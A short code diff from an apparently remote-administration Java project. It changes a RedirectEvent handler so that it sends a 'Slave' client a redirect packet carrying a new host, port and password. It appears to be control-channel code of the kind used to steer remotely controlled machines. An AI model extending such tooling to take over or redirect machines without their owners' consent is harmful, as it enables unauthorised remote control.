@@ -3,9 +3,9 @@ package com.redpois0n.events;
 import javax.swing.ImageIcon;
 
 import com.redpois0n.Slave;
-import com.redpois0n.exceptions.CloseException;
 import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet75Redirect;
 import com.redpois0n.utils.IconUtils;
 import com.redpois0n.utils.Util;
 
@@ -34,9 +34,7 @@ public class RedirectEvent extends Event {
 		packet.add(str[1]);
 		packet.add(pass);
 		
-		sl.addToSendQueue(packet);
-
-		sl.closeSocket(new CloseException("Redirecting event"));
+		sl.addToSendQueue(new Packet75Redirect(str[0], Integer.parseInt(str[1]), pass));
 	}
 
 	@Override
